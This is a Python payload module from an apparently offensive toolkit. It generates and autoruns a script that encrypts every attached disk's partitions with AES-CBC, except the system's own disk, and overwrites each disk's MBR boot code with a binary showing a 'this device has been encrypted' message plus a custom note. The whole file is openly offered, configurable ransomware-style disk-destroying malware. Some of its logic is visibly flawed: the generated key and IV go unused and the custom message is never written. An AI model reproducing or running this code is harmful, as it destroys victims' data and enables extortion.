"""
Payload that encrypts the disk with AES-CBC, then installs an executable to the MBR
which shows a message letting the user know their disk has been encrypted and a custom message.
"""

import os
import random

from libsnr.util.common_utils import print_ok, print_warning, rootfs_open
from libsnr.util.payloads.autorun import Autorun
from snr.variables import global_vars

LICENSE = "Apache-2.0"
AUTHORS = ["GlobularOne"]
INPUTS = (
    "IV", "KEY", "MESSAGE"
)

ONLINE = True

DEB_DEPENDENCIES = ("python3-pycryptodome",)

PAYLOAD = r"""#!/usr/bin/python3
import os
import platform
import shutil

from libsnr.payload.safety_pin import require_lack_of_safety_pin
from libsnr.payload.storage import query_all_block_info, get_partition_root
from libsnr.payload.context import create_context_for_mountpoint
from libsnr.util.programs.mount import Mount
from libsnr.util.programs.umount import Umount
from libsnr.util.common_utils import print_ok, print_info, print_error
from Cryptodome.Cipher import AES

KEY = "@KEY@".encode()
IV = "@IV@".encode()


def encrypt_device(info: dict):
    print_info(f"Encrypting {info['UUID']}... (0/{info['size']})", end="")
    aes = AES.new(KEY, AES.MODE_CBC, IV)
    with open(info["path"], "r+b") as stream:
        encrypted_size = 0
        while encrypted_size < info["size"]:
            data = aes.encrypt(stream.read(AES.block_size))
            stream.seek(encrypted_size)
            stream.write(data)
            encrypted_size += AES.block_size
            print_info(
                f"\rEncrypting {info['UUID']}... ({encrypted_size}/{info['size']})", end="")
    print_info(
        f"\rEncrypting {info['UUID']}... ({encrypted_size}/{info['size']}: Done)")


def main():
    require_lack_of_safety_pin()
    block_info = query_all_block_info()
    # We don't care about LVM
    print_info("Bios_disk_encryption payload started")
    context = create_context_for_mountpoint("/")
    if context is None:
        print_error("Creating context for / failed")
        return

    our_device = get_partition_root(context["device"], block_info)
    if our_device is None:
        print_error("Finding partition root device for / failed")
        return

    with open("/root/bios_disk_encryption_message.bin", "rb") as stream:
        bios_payload = stream.read()

    for device in block_info:
        if device != our_device:
            if "children" in device:
                for child in device["children"]:
                    encrypt_device(child)
        # Overwrite MBR bootstrap area
        # But not the whole MBR for one reason:
        # 1. If there is going to be a recovery, this saves the partition table
        with open(device, "r+b") as stream:
            stream.write(bios_payload)
            # Mark it bootable, as the original flag is now encrypted
            stream.seek(510)
            stream.write(b"\x55\xAA")
    print_ok("Bios_disk_encryption payload completed")


if __name__ == "__main__":
    main()
"""

DEFAULT_MESSAGE = b"This device has been encrypted. Continuing boot is not possible."

with open(os.path.join(os.path.dirname(__file__), "data", "bios_disk_encryption_mesage.bin"), "rb") as f:
    BIOS_PAYLOAD = f.read()

def load():
    # Determine largest supported custom message length
    # Maximum custom message length:
    # size of the payload - executable part - static message - one byte for null
    custom_message_max_len = len(BIOS_PAYLOAD) - (BIOS_PAYLOAD.find(DEFAULT_MESSAGE) + len(DEFAULT_MESSAGE) + 1) - 1
    global_vars.set_variable(
        "MESSAGE", "", custom_message_max_len, "Custom additional message to show"
    )


def unload():
    for inp in INPUTS:
        global_vars.del_variable(inp)


def generate(context: dict):
    print_warning("Generating a random IV! Ensure you take note of it")
    iv = random.SystemRandom().randbytes(16)
    print_ok(f"Your IV is: {iv.hex()}")

    print_warning("Generating a random key! Ensure you take note of it")
    key_raw = random.SystemRandom().randbytes(32)
    print_ok(f"Your key is: {key_raw.hex()}")

    payload = PAYLOAD
    with rootfs_open(context, "root/bios_disk_encrypt.py", "w") as stream:
        for inp in INPUTS:
            value = global_vars.get_variable(inp)
            payload = payload.replace(f"@{inp}@", f"{repr(value)}")
        stream.write(payload)
    with rootfs_open(context, "root/bios_disk_encryption_message.bin", "wb") as stream:
        # Write the part before the custom message (executable part, static message)
        stream.write(BIOS_PAYLOAD[:BIOS_PAYLOAD.find(DEFAULT_MESSAGE) + len(DEFAULT_MESSAGE) + 1])
        # Write custom message
        custom_message = global_vars.get_variable("MESSAGE").encode("ascii")
        custom_message_len = len(custom_message)
        # Write the rest of the payload
        stream.write(BIOS_PAYLOAD[BIOS_PAYLOAD.find(DEFAULT_MESSAGE) + len(DEFAULT_MESSAGE) + 1 + custom_message_len:-1])
    autorun = Autorun(context)
    autorun.add_executable("/root/bios_disk_encrypt.py")
